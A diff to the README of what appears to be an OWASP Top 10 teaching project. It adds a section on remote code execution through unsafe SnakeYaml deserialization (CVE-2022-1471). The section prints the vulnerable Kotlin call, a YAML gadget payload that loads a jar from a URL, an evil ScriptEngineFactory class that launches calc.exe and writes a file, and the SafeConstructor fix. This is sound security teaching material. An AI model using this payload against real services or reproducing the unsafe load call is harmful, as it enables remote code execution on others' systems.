@@ -122,4 +122,91 @@ Only one prepared statement and execution is created and used to return values o
 
 ## Remote code execution
 
-...
+Remote code execution (alias RCE)is also evil security issue. 
+With this attack untrusted party can execute arbitrary code and do what ever they want with our system.
+Here we will show remote code execution inside Java Virtual Machine (byte code with evil payload).
+
+**Requirements to be vulnerable**
+
+- Outdated Java library with RCE vulnerability
+  - That's why you can find outdated version of Spring Boot in parent `pom.xml`
+  - `<version>3.1.6</version>` has transitive dependency to SnakeYaml library v1.33
+  - There is [CVE-2022-1471](https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/) vulnerability reported for this version
+- Unsafe usage of SnakeYaml library to execute Unsafe deserialization vulnerability
+
+**Vulnerable back-end code**
+
+At back-end code we process YAML string sent to use from outside world with this code:
+```kotlin
+val yamlDto = Yaml().load<Any>(request.yaml)
+```
+
+When we call this with **harmless request** value in `cz.bedla.owasptop10.RemoteCodeExecutionControllerTest.callWithHarmlessData` test, result is as expected.
+
+Yaml in the Request:
+```yaml
+name: Hello world!
+```
+
+Result JSON:
+```json
+{
+  "result": "{name=Hello world!}"
+}
+```
+
+But when we are attacker, and we know that from Yaml v1.1 specification (that is implemented by vulnerable SnakeYaml v1.33) we can use special syntax to force to load and execute arbitrary class.
+
+This might be safe to do with classes like map, list, and similar.
+But when we instruct Yaml processor to call `javax.script.ScriptEngineManager` that is able to load arbitrary `.jar` file from URL and execute it, we have big problem.
+
+Our evil Yaml looks like this
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8082/evil-jar"]]]]
+```
+
+What it does is:
+1. Create instance of `ScriptEngineManager`
+2. Pass `URLClassLoader` instance as constructor parameter
+3. Instance `URLClassLoader` is created with `java.net.URL ["http://localhost:8082/evil-jar"]` value that points to Evil server returning evil `.jar` file
+4. In the `javax.script.ScriptEngineManager.initEngines` we find services using `java.util.ServiceLoader.load(...)` method
+5. This method uses constructed `URLClassLoader` with HTTP link to evil-jar
+6. When evil-jar is downloaded Service classes (`ScriptEngineFactory`) inside has to be initialized/constructed
+7. Because we have evil code in that class, our server is facing Remote code execution attack
+
+**Evil class**
+```kotlin
+class EvilScriptEngineFactory : ScriptEngineFactory {
+    init {
+        logger.info("*** Now you are hacked! ***")
+        if (System.getProperty("os.name").contains("windows", ignoreCase = true)) {
+            Runtime.getRuntime().exec(arrayOf("calc.exe"))
+        }
+
+        Files.writeString(Path.of(".", "hacked.txt"), "Now you are hacked!")
+    }
+}
+```
+
+**Evil service load definition inside .jar file**
+
+File path: `META-INF/services/javax.script.ScriptEngineFactory`
+
+Content pointing to our Evil class 
+```
+cz.bedla.owasptop10.evil.EvilScriptEngineFactory
+```
+
+**Unsafe test call ⛔️**
+
+In the `cz.bedla.owasptop10.RemoteCodeExecutionControllerTest.unsafeCallWithEvilData` test, 
+you can see that our call fails on `500 Internal Server Error`, but we are already hacked.
+
+**Safe test call ✅**
+
+When we fix vulnerable code by passing `SafeConstructor` instance to `Yaml` parser, 
+we can see that back-end fails on `500 Internal Server Error` and we are NOT hacked.
+
+There are class constructors disabled in by `org.yaml.snakeyaml.constructor.SafeConstructor.undefinedConstructor`.
+
+This is not the case with unsafe Yaml constructor at `org.yaml.snakeyaml.constructor.Constructor.Constructor(...)` with default implementation.
